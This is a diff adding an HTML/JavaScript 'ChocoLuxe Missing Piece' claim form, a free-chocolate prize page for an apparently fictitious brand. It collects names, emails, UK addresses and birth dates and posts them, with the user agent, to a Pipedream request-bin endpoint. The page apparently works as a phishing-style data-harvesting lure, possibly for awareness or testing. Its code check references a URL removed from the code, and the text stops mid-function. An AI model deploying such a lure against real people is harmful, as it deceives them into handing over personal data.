@@ -1,0 +1,923 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ChocoLuxe Missing Piece Claim Form</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+    <style>
+        :root {
+            --color-primary: #1D4ED8;
+            --color-secondary: #1D4ED8;
+            --color-background: #F3F4F6;
+            --color-hero-bg: #FFFFFF;
+            --color-text: #1F2937;
+            --color-text-light: #6B7280;
+            --color-border: #D1D5DB;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--color-background);
+            color: var(--color-text);
+        }
+        .btn-primary {
+            background-color: var(--color-primary);
+            color: white;
+            transition: all 0.2s;
+        }
+        .btn-primary:hover {
+            background-color: #3B82F6;
+            box-shadow: 0 4px 15px rgba(29, 78, 216, 0.4);
+        }
+        .btn-secondary {
+            background-color: var(--color-background);
+            color: var(--color-primary);
+            border: 1px solid var(--color-primary);
+            transition: all 0.2s;
+        }
+        .btn-secondary:hover {
+            background-color: #E5E7EB;
+            box-shadow: 0 4px 15px rgba(29, 78, 216, 0.1);
+        }
+        .card {
+            border-top: 5px solid var(--color-primary);
+            background-color: var(--color-hero-bg);
+            color: var(--color-text);
+        }
+        input, textarea {
+            background-color: var(--color-hero-bg);
+            border: 1px solid var(--color-border);
+            color: var(--color-text);
+        }
+        input:focus, textarea:focus {
+            border-color: var(--color-primary);
+            box-shadow: 0 0 0 1px var(--color-primary);
+        }
+        .progress-bar-fill {
+            background-color: var(--color-primary);
+            transition: width 0.5s ease-in-out;
+        }
+        .step-active {
+            color: var(--color-primary);
+            font-weight: 600;
+        }
+        .step-inactive {
+            color: var(--color-text-light);
+        }
+        .option-button {
+            background-color: var(--color-hero-bg);
+            border: 1px solid var(--color-border);
+            transition: background-color 0.2s;
+        }
+        .option-button:hover:not(.bg-blue-100):not(.bg-blue-200) {
+            background-color: #E5E7EB;
+        }
+        .carrier-logo {
+            max-height: 40px;
+            width: auto;
+            margin: auto;
+            object-fit: contain;
+        }
+        @keyframes spin {
+          from { transform: rotate(0deg); }
+          to { transform: rotate(360deg); }
+        }
+        .spinner {
+          animation: spin 1s linear infinite;
+        }
+        
+        /* New Shake Animation for Error Icon */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0) rotate(0deg); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-6px) rotate(-1deg); }
+            20%, 40%, 60%, 80% { transform: translateX(6px) rotate(1deg); }
+        }
+        .animate-shake {
+            animation: shake 0.82s cubic-bezier(.36,.07,.19,.97) both;
+            transform: translate3d(0, 0, 0);
+            backface-visibility: hidden;
+            perspective: 1000px;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+    
+    <header class="bg-white fixed top-0 left-0 right-0 z-10 shadow-md">
+        <nav class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex justify-center items-center">
+            <a href="#" class="text-2xl font-semibold" style="color: var(--color-primary);">
+                ChocoLuxe<span class="text-gray-900"> Rewards</span>
+            </a>
+        </nav>
+    </header>
+
+    <section id="hero" class="pt-24 pb-16 px-4 text-center bg-white shadow-inner">
+        <div class="max-w-4xl mx-auto">
+            <h1 class="text-5xl md:text-6xl font-extrabold mb-4 leading-tight text-gray-900">
+                <span class="block" style="color: var(--color-primary);">FIND YOUR</span> MISSING PIECE.
+            </h1>
+            <p class="text-lg md:text-xl text-gray-600 mb-8 max-w-2xl mx-auto">
+                Every ChocoLuxe bar contains a secret—a unique code that unlocks a final, complimentary square of indulgence. Claim it below!
+            </p>
+        </div>
+    </section>
+
+    <main class="flex-grow flex justify-center p-4">
+        <div id="app" class="w-full max-w-lg mx-auto p-6 md:p-10 card shadow-xl rounded-xl -mt-12 relative z-10">
+            <header class="text-center mb-8">
+                <h2 class="text-2xl font-semibold mb-4 tracking-tight">Claim Process</h2>
+                <p class="text-gray-500">Follow the steps below to claim your personalized chocolate square.</p>
+            </header>
+
+            <div class="mb-8">
+                <div class="flex justify-between text-xs mb-1">
+                    <span id="step-label-1" class="step-active text-center w-1/8 leading-tight">
+                        <i data-feather="key" class="w-4 h-4 mx-auto mb-1"></i>
+                        Code
+                    </span>
+                    <span id="step-label-2" class="step-inactive text-center w-1/8 leading-tight">
+                        <i data-feather="repeat" class="w-4 h-4 mx-auto mb-1"></i>
+                        Choice
+                    </span>
+                    <span id="step-label-3" class="step-inactive text-center w-1/8 leading-tight">
+                        <i data-feather="user" class="w-4 h-4 mx-auto mb-1"></i>
+                        Details
+                    </span>
+                    <span id="step-label-4" class="step-inactive text-center w-1/8 leading-tight">
+                        <i data-feather="calendar" class="w-4 h-4 mx-auto mb-1"></i>
+                        Age
+                    </span>
+                    <span id="step-label-5" class="step-inactive text-center w-1/8 leading-tight">
+                        <i data-feather="truck" class="w-4 h-4 mx-auto mb-1"></i>
+                        Carrier
+                    </span>
+                    <span id="step-label-6" class="step-inactive text-center w-1/8 leading-tight">
+                        <i data-feather="database" class="w-4 h-4 mx-auto mb-1"></i>
+                        Improve
+                    </span>
+                    <span id="step-label-7" class="step-inactive text-center w-1/8 leading-tight">
+                        <i data-feather="file-text" class="w-4 h-4 mx-auto mb-1"></i>
+                        Notices
+                    </span>
+                    <span id="step-label-8" class="step-inactive text-center w-1/8 leading-tight">
+                        <i data-feather="check-circle" class="w-4 h-4 mx-auto mb-1"></i>
+                        Confirm
+                    </span>
+                </div>
+                <div class="h-2 rounded-full bg-gray-300">
+                    <div id="progress-bar" class="progress-bar-fill h-2 rounded-full" style="width: 0%;"></div>
+                </div>
+            </div>
+
+            <form id="claim-form">
+                
+                <!-- Physical Step 2: Code Entry (Logical Step 1) -->
+                <div id="step-2" class="step-content">
+                    <h3 class="text-xl font-semibold mb-4">Enter Your Unique Code</h3>
+                    <p class="text-gray-500 mb-6">Find the 8-12 alphanumeric code printed inside the wrapper of your ChocoLuxe bar. This unlocks your missing piece.</p>
+                    <div class="space-y-4">
+                        <label for="uniqueCode" class="block text-sm font-medium text-gray-700">Unique Code (8-12 Characters)</label>
+                        <input type="text" id="uniqueCode" name="uniqueCode" maxlength="12" class="w-full p-3 rounded-lg focus:ring-1 text-gray-900" placeholder="CLX12345678" required>
+                        
+                        <button type="button" onclick="showCodeHelp()" class="text-sm font-medium text-blue-500 hover:text-blue-700 transition duration-150 p-0 m-0 leading-none block text-left -mt-2">
+                            Where do I find my code?
+                        </button>
+                        
+                        <p id="code-error" class="text-red-600 text-sm hidden"></p>
+                    </div>
+                    <div class="mt-8">
+                        <button type="button" onclick="validateCode()" class="w-full p-3 rounded-lg btn-primary font-bold">NEXT: Check Code Validity</button>
+                    </div>
+                </div>
+
+                <!-- NEW: Validation Loading Screen (Not in Progress Bar) -->
+                <div id="step-loading-check" class="step-content hidden text-center py-16">
+                    <svg class="mx-auto h-12 w-12 text-blue-500 spinner" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    <h3 class="text-xl font-semibold mt-4 mb-2">Checking Code Validity...</h3>
+                    <p class="text-gray-500 text-sm">Please wait while we verify your unique code against our records.</p>
+                </div>
+
+                <!-- NEW: Validation Error Screen (Not in Progress Bar) -->
+                <div id="step-invalid-code" class="step-content hidden text-center py-8">
+                    <i data-feather="alert-triangle" class="w-16 h-16 mx-auto mb-4 text-red-500 animate-shake"></i>
+                    <h3 class="text-2xl font-bold mb-2 text-red-700">Code Verification Failed</h3>
+                    <p class="text-gray-600 mb-8 px-4 font-medium">
+                        This code isn't valid here. Please double-check your code or try again later if you believe this is an error.
+                    </p>
+                    <button type="button" onclick="goToStep(1)" class="w-full p-3 rounded-lg bg-red-100 hover:bg-red-200 text-red-700 font-bold border border-red-300">
+                        <i data-feather="arrow-left" class="w-4 h-4 inline mr-2"></i>
+                        GO BACK TO CODE ENTRY
+                    </button>
+                </div>
+
+
+                <!-- Physical Step 3: Keep or Share Choice (Logical Step 2) -->
+                <div id="step-3" class="step-content hidden">
+                    <h3 class="text-xl font-semibold mb-4 flex items-center">
+                        <i data-feather="repeat" class="w-6 h-6 mr-2 text-blue-500"></i>
+                        What would you like to do?
+                    </h3>
+                    <p class="text-gray-500 mb-6">You can choose to claim the missing piece for yourself, or send it to someone special.</p>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <button type="button" onclick="selectChoice('keep')" id="choice-keep" class="p-6 rounded-xl option-button hover:bg-blue-50 relative">
+                            <i data-feather="home" class="w-8 h-8 mx-auto mb-3 text-gray-700"></i>
+                            <p class="font-bold text-lg text-gray-900">Keep it</p>
+                            <p class="text-sm text-gray-500">Claim the piece for yourself.</p>
+                        </button>
+
+                        <button type="button" onclick="selectChoice('share')" id="choice-share" class="p-6 rounded-xl option-button hover:bg-blue-50 relative">
+                            <i data-feather="send" class="w-8 h-8 mx-auto mb-3 text-gray-700"></i>
+                            <p class="font-bold text-lg text-gray-900">Share it</p>
+                            <p class="text-sm text-gray-500">Send it to a friend or loved one.</p>
+                        </button>
+                    </div>
+                    <p id="choice-error" class="text-red-600 text-sm mt-4 hidden">Please select an option to continue.</p>
+                    
+                    <div class="mt-4 text-center">
+                        <button type="button" onclick="startRandomSelection()" class="text-sm font-medium text-blue-500 hover:text-blue-700 transition duration-150 p-0 m-0 leading-none">
+                            Trouble choosing? Let us decide for you!
+                        </button>
+                    </div>
+
+                    <div class="mt-8 flex justify-between space-x-4">
+                        <button type="button" onclick="goToStep(1)" class="w-1/3 p-3 rounded-lg bg-gray-300 hover:bg-gray-400 transition duration-150 text-gray-700 font-bold">BACK</button>
+                        <button type="button" onclick="validateChoice()" id="choice-next-btn" class="w-2/3 p-3 rounded-lg btn-primary font-bold opacity-50 cursor-not-allowed" disabled>NEXT: Mailing Details</button>
+                    </div>
+                </div>
+
+                <!-- Physical Step 4: Mailing Details (Logical Step 3) -->
+                <div id="step-4" class="step-content hidden">
+                    <h3 id="details-title" class="text-xl font-semibold mb-4">Mailing Details</h3>
+                    <p id="details-subtitle" class="text-gray-500 mb-6">We'll mail the complimentary missing piece to this address. No custom message will be added.</p>
+
+                    <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6 rounded-lg">
+                        <div class="flex items-center">
+                            <i data-feather="alert-triangle" class="w-5 h-5 text-red-600 mr-2"></i>
+                            <p class="text-sm text-red-800 font-semibold">
+                                This claim is only valid for addresses within the <b>United Kingdom</b>.
+                            </p>
+                        </div>
+                    </div>
+                    
+                    <div class="space-y-4">
+                        <label for="name" id="name-label" class="block text-sm font-medium text-gray-700">Full Name</label>
+                        <input type="text" id="name" name="name" class="w-full p-3 rounded-lg focus:ring-1 text-gray-900" required placeholder="Full Name">
+
+                        <label for="email" id="email-label" class="block text-sm font-medium text-gray-700">Claimant's Email Address</label>
+                        <input type="email" id="email" name="email" class="w-full p-3 rounded-lg focus:ring-1 text-gray-900" required placeholder="Your Email Address (Required)">
+
+                        <label for="street_number" class="block text-sm font-medium text-gray-700">Street Number / Address Line 1</label>
+                        <input type="text" id="street_number" name="street_number" class="w-full p-3 rounded-lg focus:ring-1 text-gray-900" required placeholder="e.g., 123 Main Street">
+
+                        <label for="city" class="block text-sm font-medium text-gray-700">City</label>
+                        <input type="text" id="city" name="city" class="w-full p-3 rounded-lg focus:ring-1 text-gray-900" required placeholder="e.g., London">
+
+                        <label for="postcode" class="block text-sm font-medium text-gray-700">Postcode</label>
+                        <input type="text" id="postcode" name="postcode" class="w-full p-3 rounded-lg focus:ring-1 text-gray-900" required placeholder="e.g., SW1A 0AA">
+
+                    </div>
+
+                    <div class="mt-8 flex justify-between space-x-4">
+                        <button type="button" onclick="goToStep(2)" class="w-1/3 p-3 rounded-lg bg-gray-300 hover:bg-gray-400 transition duration-150 text-gray-700 font-bold">BACK</button>
+                        <button type="button" onclick="submitDetails()" class="w-2/3 p-3 rounded-lg btn-primary font-bold">NEXT: Age Verification</button>
+                    </div>
+                </div>
+
+                <!-- Physical Step 7: Age Verification (Logical Step 4) -->
+                <div id="step-7" class="step-content hidden">
+                    <h3 class="text-xl font-semibold mb-4 flex items-center">
+                        <i data-feather="calendar" class="w-6 h-6 mr-2 text-blue-500"></i>
+                        Age Verification
+                    </h3>
+                    <p class="text-gray-500 mb-6">Please provide your date of birth to confirm eligibility for this promotion.</p>
+                    
+                    <div class="space-y-4">
+                        <label for="dateOfBirth" class="block text-sm font-medium text-gray-700">Date of Birth</label>
+                        <input type="date" id="dateOfBirth" name="dateOfBirth" class="w-full p-3 rounded-lg focus:ring-1 text-gray-900" required onchange="checkAgeWarning()">
+                        
+                        <div id="age-warning-box" class="bg-yellow-50 border-l-4 border-yellow-500 p-4 rounded-lg hidden">
+                            <div class="flex items-center">
+                                <i data-feather="alert-triangle" class="w-5 h-5 text-yellow-600 mr-2 flex-shrink-0"></i>
+                                <p class="text-sm text-yellow-800 font-semibold">
+                                    Parental Consent Recommended
+                                </p>
+                            </div>
+                            <p class="text-xs text-yellow-700 mt-1">
+                                We strongly recommend that users under the age of 16 seek permission from a parent or guardian before submitting personal information.
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="mt-8 flex justify-between space-x-4">
+                        <button type="button" onclick="goToStep(3)" class="w-1/3 p-3 rounded-lg bg-gray-300 hover:bg-gray-400 transition duration-150 text-gray-700 font-bold">BACK</button>
+                        <button type="button" onclick="validateBirthDate()" class="w-2/3 p-3 rounded-lg btn-primary font-bold">NEXT: Select Carrier</button>
+                    </div>
+                </div>
+
+                <!-- Physical Step 8: Delivery Carrier (Logical Step 5) -->
+                <div id="step-8" class="step-content hidden">
+                    <h3 class="text-xl font-semibold mb-4">Select Your Delivery Provider</h3>
+                    <p class="text-gray-500 mb-6">Choose the carrier you prefer for the delivery of your missing piece. Both options are free.</p>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
+                        <button type="button" onclick="selectDeliveryProvider('royal_mail')" id="carrier-royal_mail" class="p-6 rounded-xl option-button hover:bg-blue-50 relative">
+                            <img src="https://cdn.freebiesupply.com/logos/large/2x/royal-mail-logo-black-and-white.png" 
+                                 onerror="this.onerror=null;this.src='https://placehold.co/120x40/000/fff?text=ROYAL+MAIL';" 
+                                 alt="Royal Mail logo" 
+                                 class="carrier-logo">
+                            <p class="font-bold text-sm mt-3 text-gray-900">Royal Mail</p>
+                            <span id="royal_mail-selected" class="absolute inset-x-0 bottom-0 py-1 bg-blue-500 text-white text-xs font-bold rounded-b-xl hidden">
+                                SELECTED
+                            </span>
+                        </button>
+
+                        <button type="button" onclick="selectDeliveryProvider('dhl')" id="carrier-dhl" class="p-6 rounded-xl option-button hover:bg-blue-50 relative">
+                            <img src="https://logos-world.net/wp-content/uploads/2020/08/DHL-Emblem.png" 
+                                 onerror="this.onerror=null;this.src='https://placehold.co/120x40/FDD000/000?text=DHL';" 
+                                 alt="DHL logo" 
+                                 class="carrier-logo">
+                            <p class="font-bold text-sm mt-3 text-gray-900">DHL</p>
+                            <span id="dhl-selected" class="absolute inset-x-0 bottom-0 py-1 bg-blue-500 text-white text-xs font-bold rounded-b-xl hidden">
+                                SELECTED
+                            </span>
+                        </button>
+                    </div>
+
+                    <div class="flex items-start mb-8">
+                        <input id="carrier_happy_checkbox" type="checkbox" class="h-4 w-4 text-blue-600 border-gray-300 rounded mt-1 focus:ring-blue-500">
+                        <label for="carrier_happy_checkbox" class="ml-3 text-sm font-medium text-gray-700 cursor-pointer">
+                            I am happy with my choice of delivery provider.
+                        </label>
+                    </div>
+
+                    <div class="mt-8 flex justify-between space-x-4">
+                        <button type="button" onclick="goToStep(4)" class="w-1/3 p-3 rounded-lg bg-gray-300 hover:bg-gray-400 transition duration-150 text-gray-700 font-bold">BACK</button>
+                        <button type="button" onclick="validateDeliveryProvider()" id="delivery-next-btn" class="w-2/3 p-3 rounded-lg btn-primary font-bold opacity-50 cursor-not-allowed" disabled>NEXT: Help us improve</button>
+                    </div>
+                </div>
+
+                <!-- Physical Step 9: Data Improvement (Logical Step 6) -->
+                <div id="step-9" class="step-content hidden">
+                    <h3 class="text-xl font-semibold mb-4 flex items-center">
+                        <i data-feather="database" class="w-6 h-6 mr-2 text-blue-500"></i>
+                        Help us improve
+                    </h3>
+                    
+                    <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6 rounded-lg">
+                        <div class="flex items-start">
+                            <i data-feather="info" class="w-5 h-5 text-blue-600 mr-2 flex-shrink-0 mt-1"></i>
+                            <p class="text-sm text-blue-800 font-semibold">
+                                <span class="font-bold">Required Data:</span> Your **approximate location** (based on IP address) is always shared to ensure service availability and performance. This cannot be opted out.
+                            </p>
+                        </div>
+                    </div>
+
+                    <p class="text-gray-500 mb-6">Please use the control below to manage your preference for sharing anonymous device information.</p>
+
+                    <div class="p-4 bg-gray-50 border border-gray-200 rounded-lg">
+                        <div class="flex items-start">
+                            <input id="data_sharing_checkbox" type="checkbox" class="h-4 w-4 text-red-600 border-gray-300 rounded mt-1 focus:ring-red-500">
+                            <label for="data_sharing_checkbox" class="ml-3 text-sm font-medium text-gray-700 cursor-pointer">
+                                <b>Opt-Out</b> of sharing my **User Agent** (browser/OS signature) for product improvement.
+                            </label>
+                        </div>
+                        <p class="text-xs text-gray-500 mt-2 ml-7">
+                            If you check this box, only your User Agent string will be excluded from our analytics data.
+                        </p>
+                    </div>
+                    
+                    <div class="mt-8 flex justify-between space-x-4">
+                        <button type="button" onclick="goToStep(5)" class="w-1/3 p-3 rounded-lg bg-gray-300 hover:bg-gray-400 transition duration-150 text-gray-700 font-bold">BACK</button>
+                        <button type="button" onclick="validateImprovement()" class="w-2/3 p-3 rounded-lg btn-primary font-bold">NEXT: Review Notices</button>
+                    </div>
+                </div>
+
+                <!-- Physical Step 1: Important Notices (Logical Step 7) -->
+                <div id="step-1" class="step-content hidden">
+                    <h3 class="text-xl font-semibold mb-4">Important Notices & Terms</h3>
+                    <p class="text-gray-500 mb-4">Please review and accept the terms and conditions before proceeding with your claim.</p>
+                    
+                    <div class="h-64 overflow-y-scroll p-4 border border-gray-300 rounded-lg bg-gray-50 text-sm text-gray-700 leading-relaxed mb-6">
+                        <h4 class="font-bold text-gray-900 mb-2">ChocoLuxe Missing Piece Campaign Terms & Conditions:</h4>
+                        <ol class="list-decimal list-inside space-y-2">
+                            <li><b>Eligibility:</b> Open to residents of the UK.</li>
+                            <li><b>Unique Code:</b> Only one claim per unique 8-12 character code found on the back of ChocoLuxe packaging is permitted.</li>
+                            <li><b>Prize:</b> The "Missing Piece" is a complimentary single square of ChocoLuxe chocolate, and delivered to the provided mailing address. No monetary alternative will be offered.</li>
+                            <li><b>Delivery:</b> Delivery is estimated at 7-10 business days. ChocoLuxe is not responsible for postal delays or incorrectly provided addresses.</li>
+                            <li><b>Data Usage:</b> By submitting this form, you agree to ChocoLuxe using your personal data (name, email, and address) solely for the purpose of fulfilling this claim.</li>
+                            <li><b>General:</b> ChocoLuxe reserves the right to cancel or modify this promotion at any time without prior notice.</li>
+                        </ol>
+                    </div>
+
+                    <div class="flex items-start mb-8">
+                        <input id="t_and_c_checkbox" type="checkbox" class="h-4 w-4 text-blue-600 border-gray-300 rounded mt-1">
+                        <label for="t_and_c_checkbox" class="ml-3 text-sm font-medium text-gray-700 cursor-pointer">
+                            I have read and agree to the Terms & Conditions and Important Notices.
+                        </label>
+                    </div>
+
+                    <div class="mt-8 flex justify-between space-x-4">
+                        <button type="button" onclick="goToStep(6)" class="w-1/3 p-3 rounded-lg bg-gray-300 hover:bg-gray-400 transition duration-150 text-gray-700 font-bold">BACK</button>
+                        <button type="button" onclick="validateNotices()" class="w-2/3 p-3 rounded-lg btn-primary font-bold">CONFIRM CLAIM</button>
+                    </div>
+                </div>
+
+                <!-- Physical Step 6: Confirmation (Logical Step 8) -->
+                <div id="step-6" class="step-content hidden text-center">
+                    <div id="confirmation-content">
+                        <svg class="mx-auto h-16 w-16 text-blue-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                        </svg>
+                        <h3 class="text-2xl font-bold mt-4 mb-2">Submission Confirmed!</h3>
+                        <p class="text-gray-500 mb-8">Thank you for participating in the ChocoLuxe Missing Piece Campaign.</p>
+                        
+                        <div id="summary-box" class="text-left p-6 bg-gray-100 rounded-xl space-y-3 mb-8 border border-gray-200">
+                            <p class="text-lg font-semibold text-gray-800" id="confirm-type-label"></p>
+                            <p class="text-sm text-gray-600"><span class="font-bold">Code:</span> <span id="confirm-code"></span></p>
+                            <p class="text-sm text-gray-600"><span class="font-bold">Provider:</span> <span id="confirm-provider"></span></p>
+                            <p class="text-sm text-gray-600"><span class="font-bold">User Agent Share:</span> <span id="confirm-data-sharing"></span></p>
+                            <p class="text-sm text-gray-600 hidden text-red-600 font-bold" id="confirm-age-warning-container"><span class="font-bold">Age Warning:</span> <span id="confirm-age-warning"></span></p>
+                            <p class="text-sm text-gray-600"><span class="font-bold" id="confirm-claimant-label">Claimant Name:</span> <span id="confirm-name"></span></p>
+                            <p class="text-sm text-gray-600"><span class="font-bold">Claimant Email:</span> <span id="confirm-email"></span></p>
+                            <p class="text-sm text-gray-600"><span class="font-bold" id="confirm-address-label">Address:</span> <span id="confirm-address"></span></p>
+                            <p class="text-sm text-red-500 font-bold italic mt-4">Note: No custom message was included with this order.</p>
+                        </div>
+
+                        <p class="text-sm text-gray-500">Your piece will be shipped within 7-10 business days.</p>
+                    </div>
+                    <div class="mt-8">
+                        <a href="https://helloukchocoluxe.wixsite.com/chocoluxe" class="w-full inline-block p-3 rounded-lg btn-secondary font-bold">RETURN TO CHOCOLUXE</a>
+                    </div>
+                </div>
+
+            </form>
+        </div>
+    </main>
+
+    <!-- Message Box and Image Modal -->
+    <div id="message-box" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center p-4 z-50">
+        <div class="bg-white p-6 rounded-lg shadow-xl max-w-sm w-full text-gray-900">
+            <h4 id="message-title" class="text-lg font-bold mb-2"></h4>
+            <p id="message-body" class="mb-4"></p>
+            <button onclick="closeMessage()" class="w-full p-2 rounded-lg bg-blue-500 hover:bg-blue-600 text-white font-semibold">OK</button>
+        </div>
+    </div>
+
+    <div id="image-modal" class="fixed inset-0 bg-black bg-opacity-70 hidden items-center justify-center p-4 z-50">
+        <div class="bg-white p-6 rounded-xl shadow-2xl max-w-lg w-full text-gray-900">
+            <h4 class="text-xl font-bold mb-4 text-center text-gray-800">Where to Find Your ChocoLuxe Code</h4>
+            
+            <div class="text-center mb-4">
+                <img src="findcode.png" 
+                     onerror="this.onerror=null;this.src='https://placehold.co/400x200/5567d1/ffffff?text=Image+Not+Found';"
+                     alt="Image showing the 8-12 character code printed inside the wrapper of the chocolate bar." 
+                     class="w-full h-auto rounded-lg mx-auto border-4 border-blue-500 shadow-md">
+            </div>
+            
+            <p class="text-sm text-gray-600 mb-2 text-center">Your unique 8-12 character code is clearly printed on the back packaging of your chocolate bar.</p>
+            <p class="text-xs text-red-600 mb-6 text-center font-semibold"><b>NOTE:</b> The ingredients and traffic light food label shown in this image are for illustration purposes only and may not be accurate for your specific product.</p>
+
+            <button onclick="closeImageModal()" class="w-full p-3 rounded-lg btn-primary font-semibold">CLOSE</button>
+        </div>
+    </div>
+    
+    <footer class="bg-gray-800 text-white p-4 text-center shadow-inner">
+        <p class="text-sm">Inspired by Milka's 2013 Missing Piece promotion. &copy; ChocoLuxe 2025</p>
+    </footer>
+
+    <script>
+        const PIPEDREAM_ENDPOINT = "https://eom0p78hudbkwcf.m.pipedream.net";
+
+        let currentStep = 1;
+        const totalSteps = 8;
+
+        const logicalToPhysicalMap = {
+            1: 2, 
+            2: 3, 
+            3: 4, 
+            4: 7, 
+            5: 8, 
+            6: 9, 
+            7: 1, 
+            8: 6  
+        };
+        
+        let formData = { choice: null, deliveryProvider: null, userAgentSharing: 'Opted In (Default)' };
+
+        const carriers = {
+            'royal_mail': {
+                name: 'Royal Mail',
+                logo: 'https://cdn.freebiesupply.com/logos/large/2x/royal-mail-logo-black-and-white.png',
+                fallback: 'https://placehold.co/120x40/000/fff?text=ROYAL+MAIL'
+            },
+            'dhl': {
+                name: 'DHL',
+                logo: 'https://logos-world.net/wp-content/uploads/2020/08/DHL-Emblem.png',
+                fallback: 'https://placehold.co/120x40/FDD000/000?text=DHL'
+            }
+        };
+
+        async function sendClaimToPipedream(data) {
+            if (data.userAgentSharing === 'Opted In (Default)') {
+                data.clientInfo = { userAgent: navigator.userAgent };
+            } else {
+                data.clientInfo = "User Agent Opted Out";
+            }
+            
+            data.approximateLocationStatus = "Always Shared via IP Metadata";
+            if (data.dateOfBirth) { delete data.dateOfBirth; }
+
+            try {
+                const response = await fetch(PIPEDREAM_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                if (!response.ok) {
+                    console.error(`Pipedream submission failed with status: ${response.status}`);
+                } else {
+                    console.log("Claim successfully submitted to Pipedream.");
+                }
+            } catch (e) {
+                console.error("Error sending document to Pipedream:", e);
+            }
+        }
+
+
+        function showMessage(title, body) {
+            document.getElementById('message-title').textContent = title;
+            document.getElementById('message-body').textContent = body;
+            document.getElementById('message-box').classList.remove('hidden');
+            document.getElementById('message-box').classList.add('flex');
+        }
+
+        function closeMessage() {
+            document.getElementById('message-box').classList.add('hidden');
+            document.getElementById('message-box').classList.remove('flex');
+        }
+
+        function showCodeHelp() {
+            document.getElementById('image-modal').classList.remove('hidden');
+            document.getElementById('image-modal').classList.add('flex');
+        }
+
+        function closeImageModal() {
+            document.getElementById('image-modal').classList.add('hidden');
+            document.getElementById('image-modal').classList.remove('flex');
+        }
+
+
+        function goToStep(logicalStep) {
+            if (logicalStep < 1 || logicalStep > totalSteps) return;
+
+            const physicalStep = logicalToPhysicalMap[logicalStep];
+
+            document.querySelectorAll('.step-content').forEach(el => el.classList.add('hidden'));
+            
+            document.getElementById('step-loading-check').classList.add('hidden');
+            document.getElementById('step-invalid-code').classList.add('hidden');
+
+            document.getElementById(`step-${physicalStep}`).classList.remove('hidden');
+
+            currentStep = logicalStep;
+            
+            const progress = (logicalStep / totalSteps) * 100;
+            document.getElementById('progress-bar').style.width = `${progress}%`;
+
+            for (let i = 1; i <= totalSteps; i++) {
+                const label = document.getElementById(`step-label-${i}`);
+                if (label) {
+                    if (i <= currentStep) {
+                        label.classList.remove('step-inactive');
+                        label.classList.add('step-active');
+                    } else {
+                        label.classList.remove('step-active');
+                        label.classList.add('step-inactive');
+                    }
+                }
+            }
+            
+            if (logicalStep === 3) {
+                updateDetailsStepContent();
+            }
+
+            feather.replace();
+        }
+
+        function showValidationScreen() {
+            document.querySelectorAll('.step-content').forEach(el => el.classList.add('hidden'));
+            document.getElementById('step-loading-check').classList.remove('hidden');
+            feather.replace(); 
+        }
+
+        function showInvalidCodeScreen() {
+            document.querySelectorAll('.step-content').forEach(el => el.classList.add('hidden'));
+            document.getElementById('step-invalid-code').classList.remove('hidden');
+            feather.replace();
+        }
+
+        async function startCodeValidation(code) {
+            await new Promise(resolve => setTimeout(resolve, 1500)); 
+
+            // const externalBlacklistUrl = ""; is removed for security
+            
+            try {
+                const response = await fetch(externalBlacklistUrl);
+
+                if (!response.ok) {
+                    console.warn(`External blacklist check failed with status: ${response.status}`);
+                    showInvalidCodeScreen(); 
+                    return;
+                }
+                
+                const blacklist = await response.json();
+                
+                if (Array.isArray(blacklist) && blacklist.includes(code)) {
+                    showInvalidCodeScreen(); 
+                    return;
+                }
+
+                goToStep(2); 
+
+            } catch (error) {
+                console.warn("Network error during external blacklist check:", error);
+                showInvalidCodeScreen(); 
+            }
+        }
+
+
+        function validateNotices() {
+            const checkbox = document.getElementById('t_and_c_checkbox');
+            if (!checkbox.checked) {
+                showMessage("Acceptance Required", "You must agree to the Terms & Conditions to proceed with your claim.");
+                return;
+            }
+            
+            finalizeClaimAndGoToConfirm();
+        }
+
+        function validateCode() {
+            const codeInput = document.getElementById('uniqueCode');
+            const code = codeInput.value.toUpperCase().trim();
+
+            if (code.length < 8 || code.length > 12 || !/^[A-Z0-9]+$/.test(code)) {
+                showMessage("Invalid Format", "Please enter a valid code (8 to 12 alphanumeric characters) found on your packaging.");
+                codeInput.focus();
+                return;
+            }
+
+            formData.uniqueCode = code;
+            
+            showValidationScreen();
+            startCodeValidation(code); 
+        }
+        
+        function selectChoice(choiceKey) {
+            formData.choice = choiceKey;
+            
+            document.getElementById('choice-keep').classList.remove('bg-blue-100', 'shadow-md', 'bg-blue-200');
+            document.getElementById('choice-share').classList.remove('bg-blue-100', 'shadow-md', 'bg-blue-200');
+            
+            document.getElementById(`choice-${choiceKey}`).classList.add('bg-blue-100', 'shadow-md');
+
+            const nextBtn = document.getElementById('choice-next-btn');
+            nextBtn.disabled = false;
+            nextBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+        }
+        
+        function startRandomSelection() {
+            const choices = ['keep', 'share'];
+            const numFlashes = 10;
+            let flashCount = 0;
+            let currentFlashIndex = 0;
+            
+            document.getElementById('choice-keep').disabled = true;
+            document.getElementById('choice-share').disabled = true;
+
